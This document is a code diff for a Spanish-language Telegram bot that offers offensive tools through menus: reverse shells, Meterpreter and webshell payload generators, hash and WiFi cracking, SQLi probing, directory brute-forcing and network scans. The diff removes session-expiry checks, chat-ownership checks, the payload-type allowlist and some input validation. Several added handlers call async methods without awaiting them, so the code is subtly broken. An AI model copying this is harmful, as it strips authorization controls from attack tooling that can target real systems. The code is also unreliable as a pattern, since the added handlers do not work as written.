-
-
-# ─── Payload Wizard ───
-
-
-def _parse_payload_endpoint(
-    value: str,
-) -> tuple[str | None, int | None, str | None]:
-    raw = value
-    if raw.startswith("["):
-        match = re.fullmatch(r"\[([^\[\]\s]+)\]:([0-9]+)", raw)
-        if not match:
-            return None, None, "Endpoint inválido. Usa [IPv6]:Puerto."
-        host, port_text = match.groups()
-        expected_version = 6
+    audit_log.log(uid, str(uid), "wizard:crack", hash_value, status, method)
+    lines = ["\U0001f511 *Hash Crack*"]
+    lines.append(f"Hash: `{result['hash']}`")
+    lines.append(f"Algoritmo: {result['algorithm']}")
+    if result.get("identified"):
+        types = [t["type"] for t in result["identified"]]
+        lines.append(f"Identificado: {', '.join(types)}")
+    if result.get("cracked"):
+        lines.append(f"\u2705 *Crackeado:* `{result['plaintext']}`")
     else:
-        match = re.fullmatch(r"([^:\s]+):([0-9]+)", raw)
-        if not match:
-            return None, None, "Endpoint inválido. Usa IP:Puerto."
-        host, port_text = match.groups()
-        expected_version = 4
+        lines.append(f"\u274c No se pudo crackear con el diccionario {method}.")
+    msg = "\n".join(lines)
+    await query.edit_message_text(msg, parse_mode="Markdown")
+    await _back_to_menu(query.message)
 
+
+async def _handle_payload_type(query, uid, payload_type):
+    wiz = user_wizards.get(uid)
+    if not wiz:
+        return
+    wiz["step"] = "select_subtype"
+    wiz["data"]["payload_type"] = payload_type
+
+    if payload_type == "reverse":
+        langs = [
+            ("\U0001f539 Bash", "payload_lang_bash"),
+            ("\U0001f7e8 Python", "payload_lang_python"),
+            ("\U0001f7e9 PHP", "payload_lang_php"),
+            ("\U0001f7ea PowerShell", "payload_lang_powershell"),
+        ]
+        keyboard = _menu_keyboard(langs, "payload")
+        await query.edit_message_text("\U0001f4a3 \u00bfLenguaje?", reply_markup=keyboard)
+    elif payload_type == "meterpreter":
+        await query.edit_message_text("Introduce IP:Puerto para el listener:")
+    elif payload_type == "webshell":
+        langs = [
+            ("\U0001f7e8 PHP", "payload_lang_php"),
+            ("\U0001f7ea ASP", "payload_lang_asp"),
+            ("\U0001f7e7 ASPX", "payload_lang_aspx"),
+            ("\U0001f7e6 JSP", "payload_lang_jsp"),
+            ("\U0001f7e5 Python CGI", "payload_lang_py"),
+        ]
+        keyboard = _menu_keyboard(langs, "payload")
+        await query.edit_message_text("\U0001f4bb \u00bfLenguaje?", reply_markup=keyboard)
+
+
+def _parse_endpoint(value: str) -> tuple[str | None, int | None, str | None]:
+    raw = value.strip()
+    if raw.startswith("["):
+        m = re.fullmatch(r"\[([^\[\]\s]+)\]:([0-9]+)", raw)
+        if not m:
+            return None, None, "Formato inv\u00e1lido. Usa [IPv6]:Puerto."
+        host, port_text = m.groups()
+    else:
+        m = re.fullmatch(r"([^:\s]+):([0-9]+)", raw)
+        if not m:
+            return None, None, "Formato inv\u00e1lido. Usa IP:Puerto."
+        host, port_text = m.groups()
     try:
         address = ipaddress.ip_address(host)
         port = int(port_text)
     except ValueError:
-        return None, None, "Endpoint inválido. Usa una IP y puerto válidos."
-
-    if address.version != expected_version:
-        form = "[IPv6]:Puerto" if expected_version == 6 else "IPv4:Puerto"
-        return None, None, f"Endpoint inválido. Usa {form}."
+        return None, None, "IP o puerto inv\u00e1lido."
     if not 1 <= port <= 65535:
-        return None, None, "Endpoint inválido. El puerto debe ser 1-65535."
-    if address.is_unspecified or address.is_multicast:
-        return None, None, "Endpoint inválido. La IP no puede ser multicast ni no especificada."
+        return None, None, "Puerto inv\u00e1lido (1-65535)."
     return str(address), port, None
 
 
-async def _start_payload_wizard(update, uid):
-    wizard = _new_wizard(uid, "payload", update.effective_chat.id)
-    keyboard = _wizard_keyboard(wizard, [
-        ("\U0001f41a Reverse Shell", "type", "reverse"),
-        ("\U0001f4bb Webshell", "type", "webshell"),
-    ])
-    await update.message.reply_text("\U0001f4a3 *Payload* \u2014 \u00bfTipo?", parse_mode="Markdown", reply_markup=keyboard)
-
-
-async def _handle_payload_type(query, uid, wizard, subtype):
-    if subtype not in {"reverse", "webshell"}:
-        await query.edit_message_text("Tipo de payload no permitido.")
-        return
-    if subtype == "webshell":
-        options = [
-            ("\U0001f7e8 PHP", "lang", "php"),
-        ]
-    else:
-        options = [
-            ("\U0001f539 Bash", "lang", "bash"),
-        ]
-    keyboard = _wizard_keyboard(wizard, options)
-    await query.edit_message_text("\U0001f4a3 \u00bfLenguaje?", reply_markup=keyboard)
-    wizard.update(step="select_lang", payload_type=subtype)
-
-
-async def _handle_payload_lang(
-    query, uid, wizard, lang, consumed_wizard=None
-):
-    active_wizard = user_wizards.get(uid)
-    if consumed_wizard is None:
-        valid_session = active_wizard is wizard
-    else:
-        valid_session = consumed_wizard is wizard
-    if (
-        not valid_session
-        or wizard.get("type") != "payload"
-        or wizard.get("step") != "select_lang"
-    ):
-        await query.edit_message_text("\u23f0 Este wizard expir\u00f3. Vuelve al men\u00fa.")
-        return
-
-    payload_type = wizard.get("payload_type")
-    if payload_type == "webshell":
-        consumed = consumed_wizard or _consume_wizard(
-            uid, wizard.get("session_id", "")
-        )
-        if not consumed:
-            await _send_expired_callback(query)
-            return
-        try:
-            result = hacking.payloads.webshell(lang)
-        except Exception as exc:
-            log.exception("Webshell wizard failed")
-            audit_log.log(
-                uid,
-                str(uid),
-                "wizard:payload",
-                lang,
-                "error",
-                str(exc),
-            )
-            await _safe_edit_message(
-                query,
-                "No se pudo generar el payload. Abre un nuevo wizard desde el menu.",
-            )
-            await _safe_reply_text(
-                query.message,
-                "Menú principal:",
-                reply_markup=MAIN_KEYBOARD,
-            )
-            return
-        status = "error" if result.get("error") else "ok"
-        audit_log.log(
-            uid,
-            str(uid),
-            "wizard:payload",
-            lang,
-            status,
-            "webshell",
-        )
-        message = _format_webshell(result)
-        await _safe_edit_message(query, message, parse_mode="Markdown")
-        await _safe_reply_text(
-            query.message,
-            "Menú principal:",
-            reply_markup=MAIN_KEYBOARD,
-        )
-        return
-    if payload_type != "reverse":
-        await query.edit_message_text("Tipo de payload no permitido.")
-        return
-
-    await query.edit_message_text(
-        "Introduce tu listener como IP:Puerto (IPv6: [IP]:Puerto):"
-    )
-    wizard.update(lang=lang, step="awaiting_endpoint")
-
-
-# ─── Red Wizard ───
-
-
-async def _start_red_wizard(update, uid):
-    wizard = _new_wizard(uid, "red", update.effective_chat.id)
-    keyboard = _wizard_keyboard(wizard, [
-        ("\u26a1 Quick", "type", "quick"),
-        ("\U0001f50e Normal", "type", "normal"),
-        ("\U0001f9e0 Full", "type", "full"),
-    ])
-    await update.message.reply_text(
-        "\U0001f4e1 *RED* — ¿Perfil Nmap?",
-        parse_mode="Markdown",
-        reply_markup=keyboard
-    )
-
-
-async def _handle_red_type(query, uid, wizard, subtype):
-    if subtype not in {"quick", "normal", "full"}:
-        await query.edit_message_text("Tipo de RED no permitido.")
-        return
-    updates = dict(
-        step="awaiting_target",
-        scan_type=subtype,
-        target=None,
-    )
-    await query.edit_message_text(
-        "Introduce una IP, dominio o rango autorizado:"
-    )
-    wizard.update(updates)
-
-
-# ─── OSINT Wizard ───
-
-
-async def _start_osint_wizard(update, uid):
-    wizard = _new_wizard(uid, "osint", update.effective_chat.id)
-    keyboard = _wizard_keyboard(wizard, [
-        ("\U0001f4e7 Email", "type", "email"),
-        ("\U0001f310 Dominio", "type", "domain"),
-    ])
-    await update.message.reply_text("\U0001f50e *OSINT* \u2014 \u00bfTipo?", parse_mode="Markdown", reply_markup=keyboard)
-
-
-async def _handle_osint_type(query, uid, wizard, subtype):
-    prompts = {
-        "email": "Introduce el email:",
-        "domain": "Introduce el dominio:",
-    }
-    if subtype not in prompts:
-        await query.edit_message_text("Tipo de OSINT no permitido.")
-        return
-    updates = dict(
-        step="awaiting_target",
-        osint_type=subtype,
-        target=None,
-    )
-    await query.edit_message_text(prompts[subtype])
-    wizard.update(updates)
-
-
-def _validate_osint_email(value: str) -> str | None:
-    if not re.fullmatch(
-        r"[^\s@]+@[^\s@.]+(?:\.[^\s@.]+)+", value
-    ):
-        return "Email inválido. Usa una dirección con dominio completo."
-    domain = value.rsplit("@", 1)[1]
-    try:
-        ipaddress.ip_address(domain)
-    except ValueError:
-        pass
-    else:
-        return "Email inválido. Debe usar un dominio, no una IP."
-    if tools_engine.validate_target(domain):
-        return "Email inválido. Usa una dirección con dominio válido."
-    return None
-
-
-def _validate_osint_domain(value: str) -> str | None:
-    try:
-        ipaddress.ip_address(value)
-    except ValueError:
-        try:
-            ipaddress.ip_network(value, strict=False)
-        except ValueError:
-            pass
-        else:
-            return "Introduce un dominio, no un rango CIDR."
-    else:
-        return "Introduce un dominio, no una dirección IP."
-
-    private_suffixes = (
-        ".home",
-        ".home.arpa",
-        ".internal",
-        ".lan",
-        ".local",
-        ".localdomain",
-        ".localhost",
-    )
-    if value.casefold().endswith(private_suffixes):
-        return "El dominio privado no está permitido."
-    return tools_engine.validate_target(value)
-
-
-def _format_email_osint(result: dict, target: str) -> str:
-    if result.get("error"):
-        return f"\u274c {result['error']}"
-
-    lines = ["\U0001f50e OSINT Email", f"Email: {result.get('email', target)}"]
-    domain = result.get("domain")
-    if domain:
-        lines.append(f"Dominio: {domain}")
-
-    mx_records = result.get("mx_records") or []
-    if mx_records:
-        lines.append("MX:")
-        lines.extend(f"- {record}" for record in mx_records[:10])
-    else:
-        lines.append("MX: sin registros reportados")
-
-    domain_info = result.get("dominio_info") or {}
-    total_certs = domain_info.get("total_certs")
-    if total_certs is not None:
-        lines.append(f"Certificados reportados: {total_certs}")
-    cert_domains = domain_info.get("subdominios_cert") or []
-    if cert_domains:
-        lines.append("Dominios en certificados:")
-        lines.extend(f"- {domain}" for domain in cert_domains[:20])
-
-    warnings = result.get("warnings") or []
-    if warnings:
-        for w in warnings:
-            lines.append(f"\u26a0\ufe0f {w}")
-
-    status = result.get("status", "ok")
-    if status == "error":
-        lines.append("\u274c OSINT fall\u00f3: todas las fuentes reportaron error")
-    elif status == "partial":
-        lines.append("\u26a0\ufe0f Resultado parcial: algunas fuentes no respondieron")
-
+def _format_payload(payload: dict) -> str:
+    if "error" in payload:
+        return f"\u274c {payload['error']}"
+    ptype = payload.get("type", "payload")
+    decoded = payload.get("decoded", payload.get("payload", ""))
+    encoded = payload.get("encoded", payload.get("encoded_b64", ""))
+    lines = [f"\U0001f4a3 *Payload ({ptype})*"]
+    lines.append(f"```\n{decoded}\n```")
+    if encoded:
+        lines.append(f"\U0001f510 Base64: `{encoded}`")
     return "\n".join(lines)
 
 
-# ─── Text Message Handler ───
+async def _handle_red_wifi_scan(query, uid):
+    await query.edit_message_text("\U0001f4f6 Escaneando redes WiFi...")
+    try:
+        result = await asyncio.to_thread(hacking.network.scan_wifi_networks)
+    except Exception as e:
+        log.exception("WiFi scan failed")
+        result = {"error": str(e)}
+    if "error" in result:
+        await query.edit_message_text(f"\u274c WiFi: {result['error']}")
+    else:
+        lines = [f"\U0001f4f6 *Redes WiFi ({result.get('total', 0)})*"]
+        for net in result.get("networks", []):
+            ssid = net.get("ssid", "?")
+            signal = net.get("signal", "?")
+            auth = net.get("auth", "?")
+            bssid = net.get("bssid", "?")
+            lines.append(f"\n*{ssid}*")
+            lines.append(f"  \U0001f4f6 Se\u00f1al: {signal}")
+            lines.append(f"  \U0001f512 Auth: {auth}")
+            if bssid:
+                lines.append(f"  \U0001f4cb BSSID: {bssid}")
+        await query.edit_message_text("\n".join(lines), parse_mode="Markdown")
+    await _back_to_menu(query.message)
 
+
+async def _handle_red_lan_scan(query, uid):
+    await query.edit_message_text("\U0001f4e1 Escaneando red local...")
+    try:
+        result = await asyncio.to_thread(hacking.network.scan_local_network)
+    except Exception as e:
+        log.exception("LAN scan failed")
+        result = {"error": str(e)}
+    if "error" in result:
+        await query.edit_message_text(f"\u274c LAN: {result['error']}")
+    else:
+        devices = result.get("devices", [])
+        lines = [f"\U0001f4e1 *Red Local* - {result.get('total', 0)} dispositivos"]
+        for d in devices[:30]:
+            ip = d.get("ip", "?")
+            mac = d.get("mac", d.get("hostname", ""))
+            source = d.get("source", d.get("interface", ""))
+            lines.append(f"\n\U0001f4bb {ip}")
+            if mac:
+                lines.append(f"  \U0001f4cb {mac}")
+            if source:
+                lines.append(f"  \U0001f4cc {source}")
+        if len(devices) > 30:
+            lines.append(f"\n... y {len(devices) - 30} m\u00e1s")
+        await query.edit_message_text("\n".join(lines), parse_mode="Markdown")
+    await _back_to_menu(query.message)
+
+
+async def _handle_red_wifi_crack(query, uid):
+    await query.edit_message_text(
+        "Introduce BSSID:WordlistPath\n"
+        "Ejemplo: AA:BB:CC:DD:EE:FF:rockyou.txt"
+    )
+    wiz = user_wizards.get(uid)
+    if wiz:
+        wiz["step"] = "awaiting_wifi_crack"
+
+
+async def _handle_osint_email(query, uid):
+    user_wizards[uid].update(step="awaiting_email_target")
+    await query.edit_message_text("Introduce el email:")
+
+
+async def _handle_osint_domain(query, uid):
+    user_wizards[uid].update(step="awaiting_domain_target")
+    await query.edit_message_text("Introduce el dominio:")
+
+
+async def _handle_osint_person(query, uid):
+    user_wizards[uid].update(step="awaiting_person_target")
+    await query.edit_message_text("Introduce el nombre o dominio para buscar:")
+
+
+async def _execute_web_nikto(query, uid, url):
+    await query.edit_message_text(f"\U0001f9f0 Ejecutando Nikto sobre {url}...")
+    try:
+        result = tools_engine.tools_engine.run_tool("nikto", url, timeout=300)
+        if result.success:
+            await query.edit_message_text(f"\u2705 Nikto completado en {result.elapsed:.0f}s\n```\n{result.stdout[:3000]}\n```", parse_mode="Markdown")
+        else:
+            await query.edit_message_text(f"\u274c Nikto fall\u00f3: {result.error or result.stderr[:500]}")
+    except Exception as e:
+        await query.edit_message_text(f"\u274c Error en Nikto: {str(e)}")
+    await _back_to_menu(query.message)
+
+
+async def _execute_web_sqli(query, uid, url):
+    await query.edit_message_text(f"\U0001f50d Probando SQLi en {url}...\n\u26a0\ufe0f Usa par\u00e1metros como ?id=1 o ?q=test")
+    user_wizards[uid].update(step="awaiting_sqli_url", data={"url": url})
+
+
+async def _execute_web_ssl(query, uid, host_port):
+    host_port = host_port.strip()
+    if ":" in host_port:
+        host, port_str = host_port.rsplit(":", 1)
+        try:
+            port = int(port_str)
+        except ValueError:
+            await query.edit_message_text("\u274c Puerto inv\u00e1lido. Usa host:puerto (ej: example.com:443)")
+            return
+    else:
+        host = host_port
+        port = 443
+    await query.edit_message_text(f"\U0001f512 Verificando SSL en {host}:{port}...")
+    try:
+        result = await asyncio.to_thread(hacking.web.ssl_check, host, port)
+        if result.get("valid"):
+            lines = [f"\u2705 *SSL en {host}:{port}*"]
+            lines.append(f"Versi\u00f3n: {result.get('version', '?')}")
+            cipher = result.get("cipher", {})
+            if cipher:
+                lines.append(f"Cifrado: {cipher.get('name', '?')} ({cipher.get('bits', '?')} bits)")
+            lines.append(f"Subject: {result.get('subject', '?')}")
+            lines.append(f"Organizaci\u00f3n: {result.get('organization', '?')}")
+            lines.append(f"Issuer: {result.get('issuer', '?')}")
+            san = result.get("san", [])
+            if san:
+                lines.append(f"SAN: {', '.join(s[1] for s in san[:5])}")
+            await query.edit_message_text("\n".join(lines), parse_mode="Markdown")
+        else:
+            await query.edit_message_text(f"\u274c SSL inv\u00e1lido: {result.get('error', 'desconocido')}")
+    except Exception as e:
+        await query.edit_message_text(f"\u274c Error SSL: {str(e)}")
+    await _back_to_menu(query.message)
+
+
+async def _execute_web_crawler(query, uid, url):
+    await query.edit_message_text(f"\U0001f577\ufe0f Escaneando directorios en {url}...")
+    try:
+        result = await asyncio.to_thread(hacking.web.dir_bruteforce, url)
+        found = result.get("found", [])
+        if found:
+            lines = [f"\U0001f577\ufe0f *Directorios encontrados* ({len(found)})"]
+            for d in found[:30]:
+                lines.append(f"- `{d['path']}` ({d['status']})")
+            if len(found) > 30:
+                lines.append(f"... y {len(found) - 30} m\u00e1s")
+            await query.edit_message_text("\n".join(lines), parse_mode="Markdown")
+        else:
+            await query.edit_message_text(f"\U0001f50d No se encontraron directorios.")
+    except Exception as e:
+        await query.edit_message_text(f"\u274c Error en Crawler: {str(e)}")
+    await _back_to_menu(query.message)
+
+
+# ─── Callback Query Handler ───
+
+_CALLBACK_HANDLERS = {
+    "recon_quick": lambda q, u, w: _prompt_target(q, u, "recon", "quick"),
+    "recon_normal": lambda q, u, w: _prompt_target(q, u, "recon", "normal"),
+    "recon_full": lambda q, u, w: _prompt_target(q, u, "recon", "full"),
+    "web_nikto": lambda q, u, w: _prompt_web_target(q, u, "nikto"),
+    "web_sqli": lambda q, u, w: _prompt_web_target(q, u, "sqli"),
+    "web_ssl": lambda q, u, w: _prompt_text(q, u, "ssl_host", "Introduce el host:puerto (ej: example.com:443):"),
+    "web_crawler": lambda q, u, w: _prompt_web_target(q, u, "crawler"),
+    "crack_hash": lambda q, u, w: _handle_crack_hash(q, u),
+    "crack_dict_integrated": lambda q, u, w: _execute_crack_now(q, u, w.get("data", {}).get("hash", ""), "integrated"),
+    "crack_dict_custom": lambda q, u, w: _prompt_text(q, u, "crack_words", "Introduce palabras separadas por comas:"),
+    "payload_reverse": lambda q, u, w: _handle_payload_type(q, u, "reverse"),
+    "payload_meterpreter": lambda q, u, w: _handle_payload_type(q, u, "meterpreter"),
+    "payload_webshell": lambda q, u, w: _handle_payload_type(q, u, "webshell"),
+    "payload_lang_bash": lambda q, u, w: _prompt_text(q, u, "payload_endpoint", "Introduce IP:Puerto para el listener:"),
+    "payload_lang_python": lambda q, u, w: _prompt_text(q, u, "payload_endpoint", "Introduce IP:Puerto para el listener:"),
+    "payload_lang_php": lambda q, u, w: _prompt_payload_lang(q, u, "php"),
+    "payload_lang_powershell": lambda q, u, w: _prompt_text(q, u, "payload_endpoint", "Introduce IP:Puerto para el listener:"),
+    "payload_lang_asp": lambda q, u, w: _prompt_payload_lang(q, u, "asp"),
+    "payload_lang_aspx": lambda q, u, w: _prompt_payload_lang(q, u, "aspx"),
+    "payload_lang_jsp": lambda q, u, w: _prompt_payload_lang(q, u, "jsp"),
+    "payload_lang_py": lambda q, u, w: _prompt_payload_lang(q, u, "py"),
+    "red_wifi_scan": lambda q, u, w: _handle_red_wifi_scan(q, u),
+    "red_wifi_crack": lambda q, u, w: _handle_red_wifi_crack(q, u),
+    "red_lan_scan": lambda q, u, w: _handle_red_lan_scan(q, u),
+    "osint_email": lambda q, u, w: _handle_osint_email(q, u),
+    "osint_domain": lambda q, u, w: _handle_osint_domain(q, u),
+    "osint_person": lambda q, u, w: _handle_osint_person(q, u),
+}
+
+
+def _prompt_target(query, uid, wizard_type, scan_type):
+    user_wizards[uid] = {"type": wizard_type, "step": "awaiting_target", "data": {"scan_type": scan_type}}
+    prompt = {"recon": "Introduce la IP, dominio o rango:", "red": "Introduce la IP, dominio o rango:"}.get(wizard_type, "Introduce el target:")
+    query.edit_message_text(prompt)
+
+
+def _prompt_web_target(query, uid, web_type):
+    user_wizards[uid] = {"type": "web", "step": "awaiting_target", "data": {"web_type": web_type}}
+    query.edit_message_text("Introduce la URL (http://...):")
+
+
+def _prompt_text(query, uid, step, prompt):
+    wiz = user_wizards.get(uid)
+    if wiz:
+        wiz["step"] = f"awaiting_{step}"
+    query.edit_message_text(prompt)
+
+
+def _prompt_payload_lang(query, uid, lang):
+    wiz = user_wizards.get(uid)
+    if not wiz or wiz.get("type") != "payload":
+        return
+    ptype = wiz.get("data", {}).get("payload_type", "webshell")
+    if ptype == "webshell":
+        result = hacking.payloads.webshell(lang)
+        if "error" in result:
+            query.edit_message_text(f"\u274c {result['error']}")
+        else:
+            msg = _format_payload(result)
+            query.edit_message_text(msg, parse_mode="Markdown")
+        _back_to_menu(query.message)
+    else:
+        wiz["step"] = "awaiting_payload_endpoint"
+        wiz["data"]["payload_lang"] = lang
+        query.edit_message_text("Introduce IP:Puerto para el listener:")
+
+
+async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    uid = update.effective_user.id
+    data = query.data
+
+    if not _check_role(uid):
+        await query.answer("No autorizado", show_alert=True)
+        return
+
+    rl = _rate_limit_msg(uid)
+    if rl:
+        await query.answer(rl, show_alert=True)
+        return
+
+    await query.answer()
+
+    if data == "cancel":
+        user_wizards.pop(uid, None)
+        await query.edit_message_text("\u274c Operaci\u00f3n cancelada.")
+        await _back_to_menu(query.message)
+        return
+
+    if data.startswith("back_"):
+        user_wizards.pop(uid, None)
+        await query.edit_message_text("\U0001f519 Volviendo al men\u00fa...")
+        await _back_to_menu(query.message)
+        return
+
+    handler = _CALLBACK_HANDLERS.get(data)
+    if handler:
+        wiz = user_wizards.get(uid, {})
+        await handler(query, uid, wiz)
+        return
+
+    log.warning("Unhandled callback: %s user=%s", data, uid)
+    await query.edit_message_text("\u274c Opci\u00f3n no reconocida.")
+
+
+# ─── Text Message Handler ───
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -1276,19 +652,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     text = update.message.text.strip()
-
-    if uid in user_wizards and _is_wizard_expired(uid):
-        await update.message.reply_text(
-            "Este wizard expiro. Abre uno nuevo desde el menu."
-        )
-        return
-
-    wizard = user_wizards.get(uid)
-    if wizard and wizard.get("chat_id") != update.effective_chat.id:
-        await update.message.reply_text(
-            "Este wizard pertenece a otro chat. Continua en el chat original."
-        )
-        return
 
     menu = {
         "\U0001f50d Recon": lambda: _start_recon_wizard(update, uid),
@@ -1307,848 +670,477 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await handler()
         return
 
-    if uid in user_wizards:
-        wizard = user_wizards[uid]
-        wtype = wizard["type"]
-        step = wizard["step"]
+    wiz = user_wizards.get(uid)
+    if not wiz:
+        await _chat_api(update, text)
+        return
 
-        if step == "awaiting_target":
-            if wtype == "objetivo":
-                state = dict(wizard)
-                consumed = _consume_wizard(
-                    uid, state.get("session_id", "")
-                )
-                if not consumed:
-                    await update.message.reply_text(
-                        "Este wizard expiro. Vuelve al menu."
-                    )
-                    return
-                try:
-                    target_engine.set_target(uid, text, "domain")
-                except Exception as exc:
-                    log.exception("Objetivo wizard failed")
-                    audit_log.log(
-                        uid,
-                        _username(update),
-                        "wizard:objetivo",
-                        text,
-                        "error",
-                        str(exc),
-                    )
-                    await _safe_reply_text(
-                        update.message,
-                        "No se pudo guardar el objetivo. Abre un nuevo wizard desde el menu.",
-                    )
-                    return
-                audit_log.log(
-                    uid,
-                    _username(update),
-                    "wizard:objetivo",
-                    text,
-                    "ok",
-                    "",
-                )
-                await _safe_reply_text(
-                    update.message,
-                    f"\u2705 Objetivo establecido: `{text}`",
-                    parse_mode="Markdown",
-                )
-                return
+    step = wiz.get("step", "")
 
-            elif wtype == "red":
-                error = tools_engine.validate_target(text)
-                if error:
-                    await _safe_reply_text(
-                        update.message, f"\u274c {error}"
-                    )
-                    return
+    # ── All steps that need target input ──
 
-                if "/" in text:
-                    target_type = "network"
-                else:
-                    try:
-                        ipaddress.ip_address(text)
-                    except ValueError:
-                        target_type = "domain"
-                    else:
-                        target_type = "ip"
+    if step == "awaiting_target":
+        wtype = wiz["type"]
+        target = text
 
-                consumed = _consume_wizard(
-                    uid, wizard.get("session_id", "")
-                )
-                if not consumed:
-                    await update.message.reply_text(
-                        "Este wizard expiro. Vuelve al menu."
-                    )
-                    return
-
-                scan_type = consumed.get("scan_type", "normal")
-                try:
-                    target_engine.set_target(uid, text, target_type)
-                    task_id = task_queue.submit(
-                        "nmap",
-                        text,
-                        {"scan_type": scan_type, "user_id": uid},
-                    )
-                    if not task_id:
-                        raise RuntimeError(
-                            "Task queue returned no task ID"
-                        )
-                except Exception as exc:
-                    log.exception("Red wizard failed")
-                    audit_log.log(
-                        uid,
-                        _username(update),
-                        "wizard:red",
-                        text,
-                        "error",
-                        str(exc),
-                    )
-                    await _safe_reply_text(
-                        update.message,
-                        "No se pudo iniciar Red. Abre un nuevo wizard desde el menu.",
-                    )
-                    await _safe_reply_text(
-                        update.message,
-                        "Menú principal:",
-                        reply_markup=MAIN_KEYBOARD,
-                    )
-                    return
-
-                audit_log.log(
-                    uid,
-                    _username(update),
-                    "wizard:red",
-                    text,
-                    "ok",
-                    f"task:{task_id} scan_type:{scan_type}",
-                )
-                msg = await _safe_reply_text(
-                    update.message,
-                    f"\u2705 `{task_id}` — Escaneando {text} ({scan_type})",
-                    parse_mode="Markdown",
-                )
-                asyncio.create_task(
-                    _poll_nmap_task(
-                        msg, task_id, return_to_menu=True
-                    )
-                )
-                return
-
-            target_type = wizard.get("target_type", "domain")
-            if wtype == "web":
-                normalized, hostname, error = _normalize_web_input(text)
-                if error:
-                    await _safe_reply_text(
-                        update.message,
-                        f"Error: {error}\n"
-                        "Introduce una URL HTTP(S) e intenta de nuevo."
-                    )
-                    return
-
-                operations = {
-                    "recon": (
-                        "recon_web",
-                        normalized,
-                        "normal",
-                        "Reconocimiento Web",
-                    ),
-                    "vuln": (
-                        "web_audit",
-                        normalized,
-                        "profundo",
-                        "Auditoría de Vulnerabilidades",
-                    ),
-                }
-                operation = operations.get(wizard.get("audit_type"))
-                if not operation:
-                    await _safe_reply_text(
-                        update.message,
-                        "Tipo de auditoria Web no permitido.",
-                    )
-                    return
-
-                playbook, playbook_target, depth, label = operation
-                state = dict(wizard)
-                consumed = _consume_wizard(
-                    uid, state.get("session_id", "")
-                )
-                if not consumed:
-                    await _safe_reply_text(
-                        update.message,
-                        "Este wizard expiro. Vuelve al menu.",
-                    )
-                    return
-
-                try:
-                    target_engine.set_target(uid, normalized, "url")
-                    task_id = task_queue.submit(
-                        "playbook",
-                        playbook_target,
-                        {"playbook": playbook, "depth": depth, "user_id": uid},
-                    )
-                    if not task_id:
-                        raise RuntimeError(
-                            "Task queue returned no task ID"
-                        )
-                except Exception as exc:
-                    log.exception("Web wizard failed")
-                    audit_log.log(
-                        uid,
-                        _username(update),
-                        "wizard:web",
-                        normalized,
-                        "error",
-                        str(exc),
-                    )
-                    await _safe_reply_text(
-                        update.message,
-                        "No se pudo iniciar Web. Abre un nuevo wizard desde el menu.",
-                    )
-                    return
-
-                audit_log.log(
-                    uid,
-                    _username(update),
-                    "wizard:web",
-                    normalized,
-                    "ok",
-                    f"task:{task_id} playbook:{playbook} depth:{depth}",
-                )
-                msg = await _safe_reply_text(
-                    update.message,
-                    f"Web iniciado: `{task_id}`\n{label}\n{normalized}",
-                    parse_mode="Markdown",
-                )
-                asyncio.create_task(
-                    _poll_playbook_task(
-                        msg,
-                        task_id,
-                        label,
-                        return_to_menu=True,
-                    )
-                )
-                return
-            elif wtype == "recon":
-                error = tools_engine.validate_target(text)
-                if error:
-                    await _safe_reply_text(
-                        update.message, f"\u274c {error}"
-                    )
-                    return
-
-                state = dict(wizard)
-                consumed = _consume_wizard(
-                    uid, state.get("session_id", "")
-                )
-                if not consumed:
-                    await _safe_reply_text(
-                        update.message,
-                        "Este wizard expiro. Vuelve al menu.",
-                    )
-                    return
-
-                target = text
-                scan_type = consumed.get("scan_type", "normal")
-                if "/" in target:
-                    target_type = "network"
-                else:
-                    try:
-                        ipaddress.ip_address(target)
-                    except ValueError:
-                        target_type = "domain"
-                    else:
-                        target_type = "ip"
-
-                try:
-                    target_engine.set_target(uid, target, target_type)
-                    task_id = task_queue.submit(
-                        "nmap",
-                        target,
-                        {"scan_type": scan_type, "user_id": uid},
-                    )
-                    if not task_id:
-                        raise RuntimeError("Task queue returned no task ID")
-                except Exception as exc:
-                    log.exception("Recon wizard failed")
-                    audit_log.log(
-                        uid,
-                        _username(update),
-                        "wizard:recon",
-                        target,
-                        "error",
-                        str(exc),
-                    )
-                    await _safe_reply_text(
-                        update.message,
-                        "No se pudo iniciar Recon. Abre un nuevo wizard desde el menu.",
-                    )
-                    return
-
-                audit_log.log(
-                    uid,
-                    _username(update),
-                    "wizard:recon",
-                    target,
-                    "ok",
-                    f"task:{task_id} scan_type:{scan_type}",
-                )
-                msg = await _safe_reply_text(
-                    update.message,
-                    f"\u2705 `{task_id}` \u2014 Escaneando {target} ({scan_type})",
-                    parse_mode="Markdown",
-                )
-                asyncio.create_task(
-                    _poll_nmap_task(msg, task_id, return_to_menu=True)
-                )
-            elif wtype == "osint":
-                osint_type = wizard.get("osint_type")
-                if osint_type == "email":
-                    error = _validate_osint_email(text)
-                    if error:
-                        await _safe_reply_text(
-                            update.message, f"\u274c {error}"
-                        )
-                        return
-
-                    consumed = _consume_wizard(
-                        uid, wizard.get("session_id", "")
-                    )
-                    if not consumed:
-                        await update.message.reply_text(
-                            "Este wizard expiro. Vuelve al menu."
-                        )
-                        return
-
-                    status_message = await _safe_reply_text(
-                        update.message,
-                        f"\U0001f50e Consultando OSINT para {text}...",
-                    )
-                    try:
-                        target_engine.set_target(uid, text, "email")
-                        result = await asyncio.to_thread(
-                            hacking.osint.email_osint, text
-                        )
-                    except Exception as exc:
-                        log.exception("OSINT email wizard failed")
-                        audit_log.log(
-                            uid,
-                            _username(update),
-                            "wizard:osint:email",
-                            text,
-                            "error",
-                            str(exc),
-                        )
-                        await _safe_edit_text(
-                            status_message,
-                            "No se pudo completar OSINT. Abre un nuevo wizard desde el menu.",
-                        )
-                        await _safe_reply_text(
-                            update.message,
-                            "Menú principal:",
-                            reply_markup=MAIN_KEYBOARD,
-                        )
-                        return
-
-                    result_status = result.get("status", "error" if result.get("error") else "ok")
-                    audit_log.log(
-                        uid,
-                        _username(update),
-                        "wizard:osint:email",
-                        text,
-                        result_status,
-                        "email_osint",
-                    )
-                    await _safe_edit_text(
-                        status_message,
-                        _format_email_osint(result, text),
-                    )
-                    await _safe_reply_text(
-                        update.message,
-                        "Menú principal:",
-                        reply_markup=MAIN_KEYBOARD,
-                    )
-                    return
-
-                if osint_type != "domain":
